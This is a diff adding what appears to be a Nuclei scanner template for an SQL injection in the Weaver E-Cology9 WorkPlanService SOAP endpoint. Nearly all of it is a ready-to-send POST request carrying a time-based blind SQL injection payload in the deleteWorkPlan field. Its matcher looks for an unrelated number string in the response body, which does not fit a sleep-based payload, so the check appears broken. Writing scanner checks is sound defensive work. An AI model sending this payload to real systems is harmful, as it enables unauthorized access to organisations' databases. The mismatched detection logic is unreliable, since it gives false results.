@@ -1,0 +1,34 @@
+id: ecology-v9-workplanservice-sqli
+
+info:
+  name: 泛微E-Cology9 WorkPlanService 前台SQL注入
+  author: admin
+  severity: high
+  description: This template detects SQL Injection vulnerabilities in SOAP-based web services.
+  tags: 泛微-协同办公OA
+
+http:
+  - raw:
+      - |
+        POST /services/WorkPlanService HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
+        Content-Type: text/xml;charset=UTF-8
+        Connection: close
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn">
+            <soapenv:Header/>
+            <soapenv:Body>
+                <web:deleteWorkPlan>
+                    <web:in0>(SELECT 8544 FROM (SELECT(SLEEP(5-(IF(27=27,0,5)))))NZeo)</web:in0>
+                    <web:in1>22</web:in1>
+                </web:deleteWorkPlan>
+            </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "85446464647658934"
+        part: body
